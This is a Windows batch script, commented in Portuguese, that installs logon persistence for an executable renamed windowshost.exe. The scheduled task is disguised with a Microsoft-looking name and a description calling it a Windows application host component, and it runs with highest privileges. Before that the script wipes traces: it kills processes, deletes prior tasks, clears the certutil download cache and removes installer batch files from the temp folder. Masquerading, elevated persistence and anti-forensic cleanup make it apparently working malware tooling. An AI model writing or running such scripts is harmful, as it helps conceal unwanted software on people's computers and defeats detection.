@echo off
title Criar Tarefa Rocket
color 0A

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    pause
    exit /b 1
)

set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

echo.
echo ========================================
echo    CRIAR TAREFA ROCKET
echo ========================================
echo.

:: Limpar tudo (rastros completos)
echo [1/3] Limpando todos os rastros...
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"
certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\CRIAR_TAREFA.bat" >nul 2>&1
timeout /t 2 /nobreak >nul
echo [OK] Limpeza completa concluida!
echo.

:: Verificar arquivo
echo [2/3] Verificando arquivo...
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao encontrado: %CAMINHO%
    echo Execute INSTALAR.bat primeiro!
    pause
    exit /b 1
)
echo [OK] Arquivo encontrado!
echo.

:: Criar tarefa
echo [3/3] Criando tarefa agendada...
powershell -ExecutionPolicy Bypass -Command "try { $action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force -ErrorAction Stop | Out-Null; Write-Host '[OK] Tarefa criada via PowerShell!' -ForegroundColor Green; exit 0 } catch { Write-Host '[AVISO] PowerShell falhou, tentando metodo alternativo...' -ForegroundColor Yellow; exit 1 }"

if %errorLevel% neq 0 (
    schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0030 /f >nul 2>&1
    if %errorLevel% neq 0 (
        echo [ERRO] Falha ao criar tarefa!
        pause
        exit /b 1
    )
    echo [OK] Tarefa criada via metodo alternativo!
)

:: Verificar tarefa
timeout /t 2 /nobreak >nul
schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa confirmada e funcionando!
) else (
    echo [AVISO] Tarefa criada mas nao encontrada. Pode ser necessario reiniciar.
)

echo.
echo ========================================
echo    TAREFA CRIADA COM SUCESSO!
echo ========================================
echo.
pause
